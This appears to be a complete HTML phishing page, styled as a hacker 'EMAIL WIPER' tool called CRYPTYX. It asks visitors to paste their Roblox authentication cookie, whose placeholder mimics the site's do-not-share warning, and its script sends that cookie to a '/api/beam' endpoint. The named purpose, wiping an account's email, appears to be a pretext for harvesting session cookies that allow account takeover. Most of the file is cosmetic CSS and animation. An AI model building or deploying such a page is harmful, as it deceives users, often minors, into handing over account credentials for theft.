<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRYPTYX // EMAIL WIPER</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-green: #00ff41;
            --cyan: #00ffff;
            --bg-color: #020202;
            --panel-bg: rgba(0, 5, 0, 0.85);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background-color: var(--bg-color);
            color: var(--neon-green);
            font-family: 'Fira Code', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Matrix Rain Canvas */
        #matrix {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -2;
            opacity: 0.3;
        }

        /* CRT Scanlines Overlay */
        .scanlines {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
            background-size: 100% 4px;
            z-index: -1;
            pointer-events: none;
        }

        /* Main Container */
        .container {
            background: var(--panel-bg);
            border: 1px solid var(--neon-green);
            border-radius: 4px;
            padding: 40px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2), inset 0 0 30px rgba(0, 255, 65, 0.05);
            position: relative;
            backdrop-filter: blur(5px);
        }

        /* Terminal Header */
        .terminal-header {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            position: absolute;
            top: 15px;
            left: 15px;
        }
        .dot { width: 10px; height: 10px; border-radius: 50%; }
        .dot.red { background: #ff5f56; box-shadow: 0 0 5px #ff5f56; }
        .dot.yellow { background: #ffbd2e; box-shadow: 0 0 5px #ffbd2e; }
        .dot.green { background: #27c93f; box-shadow: 0 0 5px #27c93f; }

        /* Glitch Title */
        .header {
            text-align: center;
            margin-top: 10px;
            margin-bottom: 40px;
        }
        .glitch {
            font-family: 'Share Tech Mono', monospace;
            font-size: 2.5rem;
            font-weight: 600;
            color: var(--neon-green);
            text-shadow: 0 0 10px var(--neon-green);
            position: relative;
            display: inline-block;
            letter-spacing: 3px;
        }
        .glitch::before, .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: var(--panel-bg);
        }
        .glitch::before {
            left: 2px;
            text-shadow: -2px 0 var(--cyan);
            animation: glitch-anim-1 2s infinite linear alternate-reverse;
        }
        .glitch::after {
            left: -2px;
            text-shadow: -2px 0 #ff00ff;
            animation: glitch-anim-2 3s infinite linear alternate-reverse;
        }
        @keyframes glitch-anim-1 {
            0% { clip-path: inset(20% 0 80% 0); }
            20% { clip-path: inset(60% 0 10% 0); }
            40% { clip-path: inset(40% 0 50% 0); }
            60% { clip-path: inset(80% 0 5% 0); }
            80% { clip-path: inset(10% 0 70% 0); }
            100% { clip-path: inset(30% 0 50% 0); }
        }
        @keyframes glitch-anim-2 {
            0% { clip-path: inset(10% 0 60% 0); }
            20% { clip-path: inset(30% 0 20% 0); }
            40% { clip-path: inset(70% 0 10% 0); }
            60% { clip-path: inset(20% 0 50% 0); }
            80% { clip-path: inset(50% 0 30% 0); }
            100% { clip-path: inset(5% 0 80% 0); }
        }

        /* Input */
        .form-group {
            margin-bottom: 30px;
            position: relative;
        }
        label {
            display: block;
            font-size: 0.8rem;
            color: var(--cyan);
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        label span { color: var(--neon-green); }
        input {
            width: 100%;
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.3);
            color: var(--neon-green);
            padding: 16px;
            font-family: 'Fira Code', monospace;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
            border-radius: 4px;
        }
        input:focus {
            border-color: var(--neon-green);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
            background: rgba(0, 255, 65, 0.1);
        }
        input::placeholder { color: rgba(0, 255, 65, 0.3); }

        /* Button */
        .btn-container { position: relative; }
        button {
            width: 100%;
            background: transparent;
            color: var(--neon-green);
            border: 2px solid var(--neon-green);
            padding: 16px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.2rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 3px;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2), inset 0 0 10px rgba(0, 255, 65, 0.1);
        }
        button:hover {
            background: var(--neon-green);
            color: #000;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.8);
        }
        button:active {
            transform: scale(0.98);
        }
        button:disabled {
            border-color: #333;
            color: #333;
            background: transparent;
            box-shadow: none;
            cursor: not-allowed;
        }

        /* Console Output */
        .console {
            margin-top: 30px;
            background: rgba(0, 0, 0, 0.8);
            border-left: 3px solid var(--neon-green);
            padding: 15px;
            font-size: 0.85rem;
            min-height: 100px;
            max-height: 150px;
            overflow-y: auto;
            font-family: 'Fira Code', monospace;
        }
        .console .line { margin-bottom: 8px; }
        .console .error { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
        .console .success { color: #00ff41; text-shadow: 0 0 5px #00ff41; font-weight: bold; }
        .console .info { color: #888; }

        /* Blinking Cursor for Console */
        .cursor {
            display: inline-block;
            width: 8px;
            height: 15px;
            background: var(--neon-green);
            animation: blink 1s step-end infinite;
            vertical-align: bottom;
        }
        @keyframes blink { 50% { opacity: 0; } }

    </style>
</head>
<body>

    <canvas id="matrix"></canvas>
    <div class="scanlines"></div>

    <div class="container">
        <div class="terminal-header">
            <div class="dot red"></div>
            <div class="dot yellow"></div>
            <div class="dot green"></div>
        </div>

        <div class="header">
            <div class="glitch" data-text="CRYPTYX">CRYPTYX</div>
            <div style="font-size: 0.9rem; color: var(--cyan); letter-spacing: 5px; margin-top: 5px;">EMAIL WIPER</div>
        </div>

        <div class="form-group">
            <label><span>></span> AUTH_COOKIE</label>
            <input type="password" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." required>
        </div>

        <div class="btn-container">
            <button id="execute-btn" onclick="executeBeam()">
                EXECUTE WIPE
            </button>
        </div>

        <div class="console" id="console">
            <div class="line info">[*] System initialized. Awaiting auth cookie...<div class="cursor"></div></div>
        </div>
    </div>

    <script>
        // --- MATRIX RAIN EFFECT ---
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let x = 0; x < columns; x++) drops[x] = 1;

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // --- BEAM LOGIC ---
        async function executeBeam() {
            const btn = document.getElementById('execute-btn');
            const consoleBox = document.getElementById('console');
            const cookie = document.getElementById('cookie').value.trim();
            
            if (!cookie) { 
                logToConsole("[!] ERR: AUTH_COOKIE required.", "error"); 
                return; 
            }
            
            btn.disabled = true;
            btn.innerText = "EXECUTING...";
            consoleBox.innerHTML = ""; 
            logToConsole("[*] Routing connection to Roblox API...", "info");
            
            try {
                const response = await fetch('/api/beam', {
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie })
                });
                const result = await response.json();
                
                if (result.success) {
                    result.data.messages.forEach(msg => {
                        if (msg.includes("successfully") || msg.includes("wiped")) { 
                            logToConsole(`[+] ${msg}`, "success"); 
                        } else { 
                            logToConsole(`[-] ${msg}`, "error"); 
                        }
                    });
                    logToConsole("[*] Process terminated.", "info");
                } else { 
                    logToConsole(`[-] API ERR: ${result.message}`, "error"); 
                }
            } catch (error) { 
                logToConsole(`[-] NETWORK ERR: ${error.message}`, "error"); 
            } finally { 
                btn.disabled = false;
                btn.innerText = "EXECUTE WIPE";
            }
        }
        
        function logToConsole(text, type) {
            const consoleBox = document.getElementById('console');
            const div = document.createElement('div');
            div.className = `line ${type}`; 
            div.innerText = text;
            consoleBox.appendChild(div); 
            
            // Add blinking cursor to the last line
            const cursor = document.createElement('div');
            cursor.className = 'cursor';
            div.appendChild(cursor);
            
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
    </script>
</body>
</html>
